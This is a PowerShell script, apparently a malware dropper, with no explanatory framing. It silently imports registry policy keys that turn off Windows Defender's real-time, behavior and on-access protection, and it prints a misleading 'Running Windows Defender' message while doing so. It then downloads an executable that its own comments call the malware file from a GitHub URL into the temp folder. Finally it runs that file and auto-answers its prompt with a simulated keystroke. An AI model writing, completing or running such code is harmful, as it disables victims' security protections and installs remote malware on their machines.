# Function to disable Windows Defender
function Disable-WindowsDefender {
    Write-Host "Running Windows Defender..."
    $regContent = @"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001
"DisableRealtimeMonitoring"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"@

    $regFilePath = "$env:TEMP\disable_defender.reg"
    $regContent | Out-File -FilePath $regFilePath -Encoding ASCII
    try {
        Start-Process regedit.exe -ArgumentList "/s $regFilePath" -Wait -ErrorAction Stop
        Write-Host "Windows Defender Disabled"
    } catch {
        Write-Host "Failed to disable Windows Defender: $_"
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender: $_" -ErrorAction SilentlyContinue
    }
}

# Function to download a file silently
function Download-File {
    param (
        [string]$url,
        [string]$outputPath
    )

    try {
        Write-Host "Downloading: $url to $outputPath"
        Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
        Write-Host "Downloaded: $url to $outputPath"
    } catch {
        Write-Host "Failed to download: $url"
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to download: $url" -ErrorAction SilentlyContinue
    }
}

# Function to run an executable silently
function Run-Executable {
    param (
        [string]$filePath
    )

    try {
        Write-Host "Executing: $filePath"
        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru
        $process.WaitForInputIdle()
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("Y")
        $process.WaitForExit()
        Write-Host "Executed: $filePath"
    } catch {
        Write-Host "Failed to execute: $filePath"
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to execute: $filePath" -ErrorAction SilentlyContinue
    }
}

# URL of the malware file
$malwareUrl = "https://github.com/angeborrelli/files/raw/main/file_installer.exe"

# Path to download the file
$downloadPath = "$env:TEMP\installer.exe"

# Ensure Windows Defender is disabled before downloading and executing the malware
Disable-WindowsDefender

# Download and run the malware file
Download-File -url $malwareUrl -outputPath $downloadPath
Run-Executable -filePath $downloadPath
